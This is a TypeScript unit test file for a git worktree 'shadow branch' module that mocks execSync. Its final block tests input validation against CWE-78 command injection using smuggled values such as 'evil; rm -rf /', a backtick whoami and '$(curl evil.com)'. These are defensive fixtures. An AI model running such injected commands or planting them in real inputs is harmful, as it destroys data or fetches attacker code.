/*!
 * SPDX-License-Identifier: Apache-2.0
 * Copyright (C) 2026 Diego Lima Nogueira de Paula
 *
 * Task 2.1: Unit tests for shadow-branch.ts (git worktree transactional layer).
 * Uses vi.mock to intercept execSync so no real git processes run.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'

// ── Module mocks (must be before imports that trigger the module) ─────────────

const execCalls: string[] = []
let execBehavior: ((cmd: string) => string) | null = null

vi.mock('node:child_process', () => ({
  execSync: (cmd: unknown, _opts?: unknown) => {
    const cmdStr = String(cmd)
    execCalls.push(cmdStr)
    if (execBehavior) return execBehavior(cmdStr)
    return ''
  },
  execFileSync: (file: unknown, args: unknown[], _opts?: unknown) => {
    const cmdStr = [String(file), ...(Array.isArray(args) ? args.map(String) : [])].join(' ')
    execCalls.push(cmdStr)
    if (execBehavior) return execBehavior(cmdStr)
    return ''
  },
}))

vi.mock('node:fs', async (importOriginal) => {
  const orig = await importOriginal<typeof import('node:fs')>()
  return {
    ...orig,
    statfsSync: () => ({
      type: 0,
      bsize: 4096,
      blocks: 1000000,
      bfree: 1000000,
      bavail: 1000000, // ~4 GB free — passes 500 MB check
      files: 0,
      ffree: 0,
    }),
  }
})

vi.mock('node:os', async (importOriginal) => {
  const orig = await importOriginal<typeof import('node:os')>()
  return { ...orig, tmpdir: () => '/tmp' }
})

// ── Imports (after mocks are registered) ─────────────────────────────────────

import { createShadowBranch, mergeShadowBranch, discardShadowBranch } from '../core/autonomy/shadow-branch.js'

const NODE_ID = 'test-node-001'

// ── Test lifecycle ────────────────────────────────────────────────────────────

beforeEach(() => {
  execCalls.length = 0
  execBehavior = null
})

afterEach(() => {
  execBehavior = null
})

// ── AC1: beginWork (createShadowBranch) ──────────────────────────────────────

describe('createShadowBranch (beginWork)', () => {
  it('records git worktree add with the correct branch name prefix', () => {
    const result = createShadowBranch(NODE_ID, '/fake/repo')
    expect(result.created).toBe(true)
    expect(result.branchName).toMatch(new RegExp(`^ai-shadow/${NODE_ID}-\\d+$`))
    const worktreeCmd = execCalls.find((c) => c.includes('git worktree add'))
    expect(worktreeCmd).toBeDefined()
    expect(worktreeCmd).toContain(`ai-shadow/${NODE_ID}`)
  })

  it('returns created: false when execSync throws on worktree add', () => {
    execBehavior = (cmd) => {
      if (cmd.includes('git worktree add')) throw new Error('git error')
      return ''
    }
    const result = createShadowBranch(NODE_ID, '/fake/repo')
    expect(result.created).toBe(false)
    expect(result.error).toBeDefined()
  })

  it('returns created: false when nodeId is empty', () => {
    const result = createShadowBranch('', '/fake/repo')
    expect(result.created).toBe(false)
  })
})

// ── AC2: commitWork (mergeShadowBranch) ──────────────────────────────────────

describe('mergeShadowBranch (commitWork)', () => {
  it('records git merge --ff-only and git branch -D commands', () => {
    const handle = { branchName: `ai-shadow/${NODE_ID}-12345`, worktreePath: '/tmp/wt' }
    const result = mergeShadowBranch(handle, 'HEAD', '/fake/repo')
    expect(result.merged).toBe(true)
    const mergeCmd = execCalls.find((c) => c.includes('--ff-only'))
    expect(mergeCmd).toBeDefined()
    expect(mergeCmd).toContain(handle.branchName)
    const deleteCmd = execCalls.find((c) => c.includes('git branch -D'))
    expect(deleteCmd).toBeDefined()
    expect(deleteCmd).toContain(handle.branchName)
  })

  it('returns merged: false on git merge failure', () => {
    execBehavior = (cmd) => {
      if (cmd.includes('--ff-only')) throw new Error('conflict')
      return ''
    }
    const handle = { branchName: `ai-shadow/${NODE_ID}-99`, worktreePath: '/tmp/wt' }
    const result = mergeShadowBranch(handle, 'HEAD', '/fake/repo')
    expect(result.merged).toBe(false)
    expect(result.error).toContain('conflict')
  })
})

// ── AC3: abortWork (discardShadowBranch) ─────────────────────────────────────

describe('discardShadowBranch (abortWork)', () => {
  it('records git worktree remove --force and git branch -D', () => {
    const handle = { branchName: `ai-shadow/${NODE_ID}-12345`, worktreePath: '/tmp/wt' }
    const result = discardShadowBranch(handle, 'HEAD', '/fake/repo')
    expect(result.discarded).toBe(true)
    const wtRemove = execCalls.find((c) => c.includes('git worktree remove'))
    expect(wtRemove).toBeDefined()
    expect(wtRemove).toContain('/tmp/wt')
    const branchDelete = execCalls.find((c) => c.includes('git branch -D'))
    expect(branchDelete).toBeDefined()
    expect(branchDelete).toContain(handle.branchName)
  })

  it('returns discarded: false when branchName is missing', () => {
    const result = discardShadowBranch({ branchName: '' }, 'HEAD', '/fake/repo')
    expect(result.discarded).toBe(false)
  })

  it('still marks discarded: true even when worktree remove fails (graceful)', () => {
    execBehavior = (cmd) => {
      if (cmd.includes('git worktree remove')) throw new Error('no worktree')
      return ''
    }
    const handle = { branchName: `ai-shadow/${NODE_ID}-5555`, worktreePath: '/tmp/wt' }
    const result = discardShadowBranch(handle, 'HEAD', '/fake/repo')
    // branch -D still runs after worktree remove fails → discarded = true
    expect(result.discarded).toBe(true)
  })
})

// ── AC1+security: CWE-78 — malicious nodeId never reaches shell ──────────────

describe('createShadowBranch — CWE-78 input validation', () => {
  it('rejects nodeId with semicolon (shell injection)', () => {
    const result = createShadowBranch('evil; rm -rf /', '/fake/repo')
    expect(result.created).toBe(false)
    expect(execCalls.length).toBe(0)
  })

  it('rejects nodeId with backtick subshell', () => {
    const result = createShadowBranch('evil`whoami`', '/fake/repo')
    expect(result.created).toBe(false)
    expect(execCalls.length).toBe(0)
  })

  it('rejects nodeId with $() subshell', () => {
    const result = createShadowBranch('$(curl evil.com)', '/fake/repo')
    expect(result.created).toBe(false)
    expect(execCalls.length).toBe(0)
  })

  it('accepts valid alphanumeric+hyphen+underscore nodeId', () => {
    const result = createShadowBranch('node_abc123-XYZ', '/fake/repo')
    expect(result.created).toBe(true)
    expect(execCalls.some((c) => c.includes('git worktree add'))).toBe(true)
  })
})
